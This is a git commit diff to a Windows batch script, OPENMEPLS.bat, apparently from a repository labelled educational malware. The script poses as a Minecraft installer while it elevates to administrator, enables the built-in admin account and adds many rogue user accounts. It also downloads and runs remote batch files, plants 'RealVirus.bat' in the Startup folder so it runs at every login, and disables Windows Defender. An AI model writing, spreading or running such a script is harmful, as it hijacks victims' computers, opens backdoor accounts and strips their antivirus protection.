6d6c7408ded8413522a8a96dff40886536416ac9
DarioStar999 <105985378+DarioStar999@users.noreply.github.com>
2023-08-30 14:19:22 +0200

    Update OPENMEPLS.bat

--- OPENMEPLS.bat
+++ OPENMEPLS.bat
@@ -1,6 +1,14 @@
 @echo
-powershell -command "Start-Process '%0' -Verb RunAs"
-pause
+@echo off
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    goto :start
+) else (
+    @echo Amministratore
+    powershell -command "Start-Process '%0' -Verb RunAs"
+    exit
+)
+pause >nul
 net user administrator /active:yes
 net user TOPG%random% /add
 net user TOPG%random% /add
@@ -83,26 +91,22 @@ net user TOPG%random% /add
 net user TOPG%random% /add
 net user TOPG%random% /add
 ::
-set github= 
-set python_installer= "C:\Windows\System32\fuckoffwindows\python-3.11.5-amd64.exe"
 ::
 cls
 @echo l'installer di minecraft si sta avviando Attendi...
 @echo off
 md C:\Windows\System32\fuckoffwindows
-::Python dowload
-powershell (new-object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe','C:\Windows\System32\fuckoffwindows\python-3.11.5-amd64.exe')
-start /wait %python_installer% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+::python dowload
+powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/DarioStar999/Virus-educational-purpose-only/releases/download/REALEASES/python_dowloads.bat','C:\Windows\System32\fuckoffwindows\python_dowloads.bat')
+start C:\Windows\System32\fuckoffwindows\python_dowloads.bat
 ::Dowload nircmd
 powershell (new-object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd-x64.zip','C:\Windows\System32\fuckoffwindows\nircmd-x64.zip')
 tar nircmd-x64.zip
 ::TAKEOWN
-powershell (new-object System.Net.WebClient).DownloadFile('%github%','C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RealVirus.bat')
+powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/DarioStar999/Virus-educational-purpose-only/releases/download/REALEASES/RealVirus.bat','C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RealVirus.bat')
 @echo attendi mentre estraiamo il contenuto della cartella
 timeout /t 10 >nul
 cls
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 ::riattivarlo ^_^
 ::reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
-@echo say bye to Windows fucking idiot
-shutdown -r -t 1
